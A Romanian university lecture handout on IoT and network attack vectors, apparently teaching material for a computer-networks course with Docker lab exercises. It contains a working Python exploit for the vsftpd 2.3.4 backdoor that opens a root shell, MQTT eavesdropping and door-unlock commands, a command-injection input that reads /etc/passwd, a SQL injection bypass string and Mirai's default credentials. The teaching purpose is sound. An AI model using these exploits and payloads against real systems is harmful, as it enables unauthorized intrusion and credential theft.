# Vectori de Atac în Rețele IoT și Infrastructuri de Calcul

## Cuprins

1. [Introducere în Threat Landscape](#1-introducere-în-threat-landscape)
2. [Vectori de Atac la Nivel de Rețea](#2-vectori-de-atac-la-nivel-de-rețea)
3. [Atacuri asupra Protocoalelor IoT](#3-atacuri-asupra-protocoalelor-iot)
4. [Exploatarea Vulnerabilităților Software](#4-exploatarea-vulnerabilităților-software)
5. [Atacuri Man-in-the-Middle](#5-atacuri-man-in-the-middle)
6. [Denial of Service în Contexte IoT](#6-denial-of-service-în-contexte-iot)
7. [Studii de Caz și Analiză](#7-studii-de-caz-și-analiză)

---

## 1. Introducere în Threat Landscape

### 1.1 Modelul Threat Actor

Înțelegerea profilului atacatorului constituie fundamentul oricărei strategii defensive eficiente. Clasificarea actorilor malițioși se realizează pe multiple axe complementare: motivație (financiară, ideologică, statală), sofisticare tehnică (script kiddies → APT), persistență temporală și resursele disponibile.

**Categorii principale de threat actors:**

| Categorie | Caracteristici | TTPs Tipice | Ținte IoT |
|-----------|---------------|-------------|-----------|
| Script Kiddies | Cunoștințe limitate, utilizare tools existente | Scanare automată, exploits publice | Dispozitive neactualizate, credențiale default |
| Hacktivists | Motivație ideologică, impact mediatic | DDoS, defacement, leak-uri | Infrastructură critică cu vizibilitate |
| Criminali | Profit financiar, operațiuni scalabile | Ransomware, botnets, cryptomining | Dispozitive în masă pentru botnets |
| APT (State) | Resurse nelimitate, persistență înaltă | Supply chain, zero-days, lateral movement | Infrastructură critică, SCADA/ICS |

### 1.2 Suprafața de Atac în IoT

Dispozitivele IoT extind dramatic suprafața de atac a unei organizații prin caracteristici intrinseci: cicluri de update rare, interfețe de management expuse, protocoale legacy, și adesea, absența conceptului de "end-of-life" în strategia de securitate.

```
┌─────────────────────────────────────────────────────────────────┐
│                    SUPRAFAȚA DE ATAC IoT                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐           │
│  │  Hardware   │   │  Firmware   │   │   Network   │           │
│  ├─────────────┤   ├─────────────┤   ├─────────────┤           │
│  │ JTAG/UART   │   │ Binaries    │   │ Protocols   │           │
│  │ Side-channel│   │ Config files│   │ APIs        │           │
│  │ Tampering   │   │ Crypto keys │   │ Services    │           │
│  └─────────────┘   └─────────────┘   └─────────────┘           │
│                                                                 │
│  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐           │
│  │    Cloud    │   │   Mobile    │   │  Physical   │           │
│  ├─────────────┤   ├─────────────┤   ├─────────────┤           │
│  │ Backend APIs│   │ Companion   │   │ Local access│           │
│  │ Data storage│   │ BLE/WiFi    │   │ Social eng. │           │
│  │ Credentials │   │ App vulns   │   │ Disposal    │           │
│  └─────────────┘   └─────────────┘   └─────────────┘           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Vectori de Atac la Nivel de Rețea

### 2.1 Scanarea Porturilor și Service Discovery

Scanarea porturilor reprezintă etapa de reconnaissance fundamentală în kill chain-ul unui atac. Tehnicile variază de la simpla verificare TCP Connect până la metodele avansate de evasion IDS.

**Tehnici de scanare și caracteristici:**

```python
# Tipuri de scanări și semnături lor în trafic
SCAN_TECHNIQUES = {
    'TCP_CONNECT': {
        'description': 'Three-way handshake complet',
        'stealth': 'LOW',  # Lasă urme în loguri
        'reliability': 'HIGH',
        'firewall_evasion': 'POOR',
        'signature': 'SYN → SYN-ACK → ACK → RST'
    },
    'SYN_SCAN': {
        'description': 'Half-open scan (SYN only)',
        'stealth': 'MEDIUM',
        'reliability': 'HIGH',
        'firewall_evasion': 'MEDIUM',
        'signature': 'SYN → SYN-ACK (port open) / RST (closed)'
    },
    'FIN_SCAN': {
        'description': 'Exploatează RFC 793 compliance',
        'stealth': 'HIGH',
        'reliability': 'MEDIUM',  # Nu funcționează pe Windows
        'firewall_evasion': 'GOOD',
        'signature': 'FIN → (no response = open) / RST (closed)'
    },
    'XMAS_SCAN': {
        'description': 'FIN+PSH+URG flags',
        'stealth': 'HIGH',
        'reliability': 'MEDIUM',
        'firewall_evasion': 'GOOD',
        'signature': 'Conspicuous pattern, ușor de detectat'
    },
    'NULL_SCAN': {
        'description': 'Zero flags',
        'stealth': 'HIGH',
        'reliability': 'LOW',
        'firewall_evasion': 'GOOD',
        'signature': 'Packet without flags'
    },
    'UDP_SCAN': {
        'description': 'Servicii UDP (DNS, SNMP, MQTT)',
        'stealth': 'MEDIUM',
        'reliability': 'LOW',  # ICMP Port Unreachable rate-limited
        'firewall_evasion': 'VARIABLE',
        'signature': 'UDP probe → ICMP unreachable / response'
    }
}
```

### 2.2 Banner Grabbing și Service Fingerprinting

Identificarea precisă a serviciilor permite atacatorului să determine vulnerabilitățile aplicabile. Tehnicile variază de la simple conexiuni TCP până la analiză comportamentală sofisticată.

**Metodologie banner grabbing:**

```
┌──────────────────────────────────────────────────────────────┐
│                    BANNER GRABBING WORKFLOW                  │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. CONNECT         2. RECEIVE          3. ANALYZE           │
│  ┌─────────┐       ┌─────────┐        ┌─────────────┐       │
│  │ TCP/UDP │  ───► │ Banner  │  ───►  │ Version     │       │
│  │ Connect │       │ String  │        │ Extraction  │       │
│  └─────────┘       └─────────┘        └─────────────┘       │
│       │                                      │               │
│       ▼                                      ▼               │
│  4. PROBE           5. FINGERPRINT     6. CVE LOOKUP         │
│  ┌─────────┐       ┌─────────┐        ┌─────────────┐       │
│  │ Protocol│  ───► │ Response│  ───►  │ Vuln Match  │       │
│  │ Commands│       │ Analysis│        │ CVSS Score  │       │
│  └─────────┘       └─────────┘        └─────────────┘       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

**Exemple de bannere și vulnerabilități asociate:**

| Serviciu | Banner Example | Vulnerabilitate Notabilă |
|----------|----------------|--------------------------|
| vsftpd 2.3.4 | `220 (vsFTPd 2.3.4)` | CVE-2011-2523 (Backdoor) |
| OpenSSH 7.2p2 | `SSH-2.0-OpenSSH_7.2p2` | CVE-2016-0777/0778 |
| Apache 2.4.49 | `Server: Apache/2.4.49` | CVE-2021-41773 (Path Traversal) |
| Mosquitto 1.x | `MQTT CONNACK` | Implicit: auth bypass, cleartext |

### 2.3 ARP Poisoning și Layer 2 Attacks

Atacurile la nivelul legăturii de date exploatează încrederea implicită în protocolul ARP și absența autentificării în Ethernet.

**Mecanismul ARP Poisoning:**

```
Normal:                          Poisoned:
┌────────┐    ARP     ┌────────┐     ┌────────┐  ARP  ┌────────┐
│ Victim │ ─────────► │ Router │     │ Victim │ ────► │Attacker│
│10.0.0.5│            │10.0.0.1│     │10.0.0.5│       │10.0.0.9│
│MAC: AA │            │MAC: BB │     │MAC: AA │       │MAC: CC │
└────────┘            └────────┘     └────────┘       └────────┘
                                           │              │
    ARP Reply:                            │    Fake ARP   │
    10.0.0.1 is at BB                     │    10.0.0.1   │
                                          │    is at CC   │
                                          │              │
                                          ▼              ▼
                                     Traffic redirected through
                                     attacker (MitM position)
```

**Consecințe în context IoT:**
- Interceptarea traficului MQTT necriptat
- Modificarea comenzilor către actuatoare
- Injectarea de mesaje false în topicuri
- Capturarea credențialelor transmise în plaintext

---

## 3. Atacuri asupra Protocoalelor IoT

### 3.1 Vulnerabilități MQTT

MQTT, prin design-ul său minimalist orientat spre eficiență, sacrifică adesea securitatea pentru simplitate. Configurațiile default prezintă riscuri semnificative.

**Vectori de atac MQTT:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    MQTT ATTACK VECTORS                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 1. ANONYMOUS ACCESS                                      │   │
│  │    ─────────────────                                     │   │
│  │    allow_anonymous = true                                │   │
│  │    → Subscribe to # (all topics)                         │   │
│  │    → Publish to control topics                           │   │
│  │    → Complete visibility into IoT infrastructure         │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 2. CLEARTEXT INTERCEPTION                                │   │
│  │    ────────────────────────                              │   │
│  │    Port 1883 (no TLS)                                    │   │
│  │    → Sniff CONNECT packets (credentials)                 │   │
│  │    → Capture sensitive telemetry                         │   │
│  │    → Replay attacks on publish messages                  │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 3. TOPIC ENUMERATION                                     │   │
│  │    ─────────────────────                                 │   │
│  │    Subscribe: home/#, factory/#, sensors/#               │   │
│  │    → Discover infrastructure topology                    │   │
│  │    → Identify high-value targets                         │   │
│  │    → Map sensor/actuator relationships                   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │ 4. COMMAND INJECTION                                     │   │
│  │    ─────────────────────                                 │   │
│  │    Publish malicious payloads to:                        │   │
│  │    → commands/actuator/activate                          │   │
│  │    → config/sensor/update                                │   │
│  │    → firmware/device/upgrade                             │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Demonstrație practică:**

```bash
# Subscribere la toate topicurile (atacator)
mosquitto_sub -h broker.vulnerable -t "#" -v

# Output interceptat:
# home/living/temperature 23.5
# home/door/status unlocked
# factory/line1/speed 1500rpm
# users/admin/session eyJhbGc...

# Injecție de comandă (atacator)
mosquitto_pub -h broker.vulnerable \
    -t "home/door/command" \
    -m "unlock"
```

### 3.2 Atacuri CoAP și HTTP

**CoAP (Constrained Application Protocol):**
- UDP-based, no built-in security
- Amplification attacks (similar DNS amplification)
- Resource exhaustion pe dispozitive constrained

**HTTP/REST APIs în IoT:**
- OWASP API Security Top 10 aplicabil
- Broken authentication pe dispozitive embedded
- Mass assignment în firmware updates

### 3.3 Exploatarea Protocoalelor Legacy

Multe dispozitive IoT industriale utilizează protocoale vechi, design-ate înainte de era conectivității:

| Protocol | Porturi | Vulnerabilități | Impact |
|----------|---------|-----------------|--------|
| Modbus | 502/TCP | No authentication | Control PLC |
| BACnet | 47808/UDP | Broadcast discovery | Building automation |
| DNP3 | 20000/TCP | Limited auth | Power grid |
| OPC UA | 4840/TCP | Complex, misconfig | Industrial |

---

## 4. Exploatarea Vulnerabilităților Software

### 4.1 CVE-2011-2523: vsftpd 2.3.4 Backdoor

Exemplu clasic de supply chain attack: versiunea compromisă a serverului FTP includea un backdoor activat prin trimiterea caracterului `:)` în câmpul username.

**Mecanismul tehnic:**

```c
// Cod backdoor injectat în vsf_main.c
if (pstr_get_prev(p_str, ':') == ')') {
    // Lansează shell pe port 6200
    vsf_sysutil_fork_failok();
    // ... shell binding code ...
}
```

**Faze de exploatare:**

```
Phase 1: TRIGGER                Phase 2: CONNECT
┌─────────────────────┐        ┌─────────────────────┐
│ FTP CONNECT         │        │ TCP CONNECT         │
│ USER test:)         │  ───►  │ Port 6200           │
│ PASS anything       │        │ Root shell access   │
└─────────────────────┘        └─────────────────────┘
        │                               │
        │ Backdoor activat              │ Interactive shell
        │ pe thread separat             │ cu privilegii root
        ▼                               ▼
   Normal FTP denied              # id
   (authentication fails)         uid=0(root) gid=0(root)
```

**Cod Python exploit:**

```python
import socket
import time

def exploit_vsftpd_234(target: str, port: int = 21) -> bool:
    """
    Exploatează CVE-2011-2523 pentru vsftpd 2.3.4
    
    Trimite trigger-ul ':)' în username pentru a activa
    backdoor-ul care ascultă pe portul 6200.
    """
    # Pasul 1: Trigger backdoor
    trigger_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    trigger_sock.connect((target, port))
    
    # Primește banner
    banner = trigger_sock.recv(1024)
    if b'vsFTPd 2.3.4' not in banner:
        return False
    
    # Trimite trigger
    trigger_sock.send(b'USER backdoor:)\r\n')
    trigger_sock.recv(1024)
    trigger_sock.send(b'PASS anything\r\n')
    
    # Așteaptă activarea backdoor-ului
    time.sleep(2)
    trigger_sock.close()
    
    # Pasul 2: Conectare la shell
    shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_sock.settimeout(5)
    
    try:
        shell_sock.connect((target, 6200))
        shell_sock.send(b'id\n')
        response = shell_sock.recv(1024)
        if b'uid=0' in response:
            return True  # Root access obținut
    except socket.timeout:
        return False
    
    return False
```

### 4.2 Buffer Overflow în Firmware IoT

Dispozitivele embedded sunt frecvent vulnerabile la buffer overflow datorită:
- Utilizării limbajelor unsafe (C/C++)
- Lipsa protecțiilor moderne (ASLR, Stack Canaries, NX)
- Resurse limitate pentru validări extensive

**Anatomia unui buffer overflow:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    STACK LAYOUT (IoT Device)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HIGH ADDRESSES                                                 │
│  ┌─────────────────────────────────────┐                       │
│  │         Return Address              │ ◄── Overwritten!      │
│  ├─────────────────────────────────────┤                       │
│  │         Saved Frame Pointer         │ ◄── Overwritten!      │
│  ├─────────────────────────────────────┤                       │
│  │         Local Variables             │                       │
│  │         char buffer[64]             │ ◄── Overflow starts   │
│  ├─────────────────────────────────────┤                       │
│  │              ...                    │                       │
│  └─────────────────────────────────────┘                       │
│  LOW ADDRESSES                                                  │
│                                                                 │
│  Payload: [NOP sled][Shellcode][Padding][Return to NOP sled]   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 4.3 Injection Attacks

**Command Injection în interfețe web IoT:**

```python
# Vulnerabilitate tipică în router firmware
def ping_test(target):
    # VULNERABLE: user input direct în system()
    os.system(f"ping -c 3 {target}")

# Exploatare:
# Input: "8.8.8.8; cat /etc/passwd"
# Rezultat: ping + exfiltrare credentials
```

**SQL Injection în baze de date embedded (SQLite):**

```sql
-- Autentificare bypass
-- Input: admin' OR '1'='1
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''
```

---

## 5. Atacuri Man-in-the-Middle

### 5.1 Interceptarea Traficului MQTT

În absența TLS, tot traficul MQTT este vizibil pentru un atacator poziționat în rețea.

**Metodologie completă MitM pentru MQTT:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    MQTT MitM ATTACK CHAIN                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Step 1: POSITIONING                                            │
│  ────────────────────                                           │
│  • ARP poisoning (ettercap, arpspoof)                          │
│  • DHCP starvation + rogue DHCP                                │
│  • DNS spoofing pentru broker hostname                         │
│                                                                 │
│  Step 2: INTERCEPTION                                           │
│  ─────────────────────                                          │
│  • tcpdump -i eth0 port 1883                                   │
│  • Wireshark filter: mqtt                                       │
│  • Scapy custom parser                                         │
│                                                                 │
│  Step 3: ANALYSIS                                               │
│  ────────────────                                               │
│  • Extract credentials from CONNECT                            │
│  • Map topic structure                                         │
│  • Identify control messages                                   │
│                                                                 │
│  Step 4: EXPLOITATION                                           │
│  ─────────────────────                                          │
│  • Inject malicious PUBLISH                                    │
│  • Modify sensor data in transit                               │
│  • Replay captured commands                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 5.2 SSL/TLS Stripping și Downgrade

Chiar cu TLS disponibil, atacatorii pot forța downgrade:

```
Client ──────► [Attacker] ──────► Broker
  │               │                 │
  │ MQTT:1883     │ MQTT:1883       │
  │ (plaintext)   │ (or MQTTS:8883) │
  │               │                 │
  │ Crede că e    │ Relay traffic   │ Broker acceptă
  │ direct la     │ și interceptează│ conexiunea
  │ broker        │                 │
```

---

## 6. Denial of Service în Contexte IoT

### 6.1 Resource Exhaustion

Dispozitivele IoT au resurse limitate, făcându-le ținte ușoare pentru DoS:

| Vector | Țintă | Efect |
|--------|-------|-------|
| SYN Flood | TCP Stack | Connection table exhaustion |
| MQTT Storm | Broker + Devices | Memory/CPU exhaustion |
| CoAP Amplification | Rețea | Bandwidth saturation |
| Slow Loris | HTTP Server | Connection pool exhaustion |

### 6.2 Atacuri de Amplificare

```
┌─────────────────────────────────────────────────────────────────┐
│                    AMPLIFICATION ATTACK                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Attacker                 Reflector                  Victim     │
│  ────────                 ─────────                  ──────     │
│     │                         │                         │       │
│     │ Spoofed request         │                         │       │
│     │ (src=victim IP)         │                         │       │
│     │ ───────────────────►    │                         │       │
│     │                         │                         │       │
│     │                         │ Large response          │       │
│     │                         │ (amplified)             │       │
│     │                         │ ──────────────────────► │       │
│     │                         │                         │       │
│                                                                 │
│  Amplification factors:                                         │
│  • DNS: 28-54x                                                  │
│  • NTP: 556x                                                    │
│  • CoAP: 10-50x                                                 │
│  • SSDP: 30x                                                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.3 Botnets IoT (Mirai și Descendenți)

**Caracteristici Mirai:**
- Scanare automată pentru Telnet/SSH cu credențiale default
- Propagare virală exponențială
- DDoS capabilities: UDP flood, SYN flood, HTTP flood
- Target-uri: Camere IP, routere, DVR-uri

**Credențiale default exploatate:**

```python
MIRAI_CREDENTIALS = [
    ('root', 'root'),
    ('admin', 'admin'),
    ('root', '123456'),
    ('admin', 'password'),
    ('root', 'vizxv'),      # Camera brands
    ('root', 'xc3511'),     # DVRs
    ('support', 'support'), # ISP equipment
    # ... 60+ perechi ...
]
```

---

## 7. Studii de Caz și Analiză

### 7.1 Atacul Mirai asupra Dyn DNS (2016)

**Cronologie:**
- ~100,000 dispozitive IoT compromise
- Target: Dyn DNS infrastructure
- Impact: Twitter, Netflix, Reddit, Airbnb offline
- Trafic: ~1.2 Tbps

**Lecții:**
1. Credențialele default sunt riscuri sistemice
2. Dispozitivele IoT necesită management lifecycle
3. Infrastructura DNS este single point of failure
4. Amplificarea prin botnets depășește capacitățile tradiționale

### 7.2 VPNFilter (2018)

**Caracteristici avansate:**
- Modular malware pentru routere
- Persistență (supraviețuiește reboot)
- MITM capabilities pentru SCADA
- Self-destruct (brick device)

### 7.3 Implicații pentru Apărare

Înțelegerea vectorilor de atac informează direct strategia defensivă:

| Vector | Contramăsură |
|--------|--------------|
| Scanare porturi | Firewall, port knocking, IDS |
| Anonymous MQTT | Autentificare obligatorie, ACLs |
| Cleartext traffic | TLS 1.2+ obligatoriu |
| Default credentials | Politici enforce password change |
| Buffer overflow | Firmware updates, memory protection |
| DoS/DDoS | Rate limiting, geo-filtering, CDN |

---

## Exerciții Practice

### Exercițiul 3.1: Analiza unui Atac de Scanare

Utilizând `ex_01_port_scanner.py`, efectuați:
1. Scanare TCP Connect pe target-ul Docker
2. Identificați serviciile prin banner grabbing
3. Corelați cu baza de vulnerabilități

### Exercițiul 3.2: Capturarea Traficului MQTT

Cu `ex_03_packet_sniffer.py`:
1. Porniți captura cu filtru MQTT
2. Publicați mesaje pe broker (plain.conf)
3. Analizați pachetele capturate
4. Identificați credențialele și topicurile

### Exercițiul 3.3: Exploatarea vsftpd 2.3.4

Folosind containerul Docker și `ftp_backdoor_vsftpd.py`:
1. Verificați versiunea serviciului FTP
2. Executați exploitul CVE-2011-2523
3. Demonstrați accesul root obținut
4. Documentați în raport cu `report_generator.py`

---

## Referințe

1. MITRE ATT&CK for ICS: https://attack.mitre.org/techniques/ics/
2. OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
3. Shodan IoT Exposure Reports
4. NIST Cybersecurity Framework for IoT
5. CVE Database: https://cve.mitre.org/

---

*Document generat pentru Săptămâna 13 - Rețele de Calculatoare, ASE-CSIE*
*Autor: Colectivul de Tehnologii Web*
